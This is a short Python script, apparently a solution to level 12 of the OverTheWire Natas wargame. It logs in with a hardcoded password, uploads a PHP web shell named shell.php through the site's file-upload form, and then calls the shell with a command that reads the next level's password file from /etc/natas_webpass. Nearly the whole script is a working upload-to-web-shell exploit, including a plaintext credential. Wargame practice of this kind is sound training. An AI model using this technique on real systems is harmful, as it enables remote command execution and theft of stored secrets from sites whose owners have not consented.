import requests
import bs4
username = "natas12"
password = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"

url = "http://%s.natas.labs.overthewire.org" % username
session = requests.Session()

data = {"filename": "shell.php"}
file = {"uploadedfile": open("natas12.php")}
response = session.post(url, auth = (username,password), files=file, data=data)

soup = bs4.BeautifulSoup(response.text, 'lxml')
upload_link = soup.find('a')
webshell_url = url + "/"+ upload_link['href']
webshell_response = session.get(webshell_url+"?c=cat /etc/natas_webpass/natas13", auth = (username,password))
print(webshell_response.text)